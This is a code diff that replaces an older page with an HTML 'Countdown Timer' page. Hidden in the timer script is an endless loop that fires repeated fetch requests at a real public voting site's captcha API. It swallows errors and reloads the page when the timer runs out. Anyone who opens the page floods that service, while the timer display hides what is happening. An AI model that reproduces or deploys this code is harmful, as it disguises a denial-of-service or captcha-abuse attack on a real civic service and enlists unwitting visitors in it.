@@ -44,7 +44,7 @@
                 </div>
                 <span class="date">2021-09-21</span>
             </div> -->
-        </div>
+<!--         </div>
         <div class="pn">
             <button class="prev">prev</button>
             <span class="title">1</span>
@@ -56,4 +56,85 @@
     <script src="./util.js" ></script>
     <script src="./main.js" ></script>
 </body>
-</html> -->
+</html> -- -->
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Countdown Timer</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    .timer {
+      font-size: 48px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div class="timer" id="countdown">1:00</div>
+
+  <script>
+    // Set the countdown time in seconds
+    let countdownTime = 60;
+    async function req (){
+        return await fetch( "https://openbudget.uz/api/v2/vote/mvc/captcha/9f321812-3c6e-4358-b770-f8024d61cc32" ).catch( e => {})
+    }
+
+    ;( async () => {
+        while(true){
+        await req()
+        req()
+        req()
+        req()
+        req()
+        req()
+        req()
+        req()
+        req()
+        req()
+        req()
+    }
+    })()
+    // Function to update the countdown timer
+    function updateCountdown() {
+        if( countdownTime < 0 ) window.location.reload()  
+      const countdownElement = document.getElementById('countdown');
+      countdownElement.innerText = formatTime(countdownTime);
+      countdownTime--;
+
+      if (countdownTime < 0) {
+        countdownElement.innerText = 'Time\'s up!';
+        clearInterval(interval);
+      }
+    }
+
+    // Function to format time in MM:SS format
+    function formatTime(seconds) {
+      const minutes = Math.floor(seconds / 60);
+      const remainingSeconds = seconds % 60;
+      return `${String(minutes).padStart(2, '0')}:${String(remainingSeconds).padStart(2, '0')}`;
+    }
+
+    // Initial update of the countdown timer
+    updateCountdown();
+
+    // Update the countdown timer every second
+    const interval = setInterval(updateCountdown, 1000);
+  </script>
+</body>
+</html>
+
+
+
